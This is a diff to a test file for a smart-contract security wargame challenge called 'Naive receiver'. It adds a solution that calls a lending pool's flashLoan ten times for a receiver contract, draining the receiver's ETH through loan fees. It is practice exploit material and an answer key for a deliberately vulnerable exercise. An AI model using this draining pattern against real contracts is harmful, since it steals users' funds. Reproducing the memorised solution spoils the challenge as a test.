@@ -35,11 +35,15 @@ describe('[Challenge] Naive receiver', function () {
             await ethers.provider.getBalance(receiver.address)
         ).to.eq(ETHER_IN_RECEIVER);
     });
-
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const loanAmount = ethers.utils.parseUnits("1", "ether"); // 1 ETH
+        const ETH_ADDRESS = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"; // Address representing ETH
+        const data = "0x"; // Placeholder for the data parameter
+    
+        for (let i = 0; i < 10; i++) {
+            await pool.flashLoan(receiver.address, ETH_ADDRESS, loanAmount, data);
+        }
     });
-
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
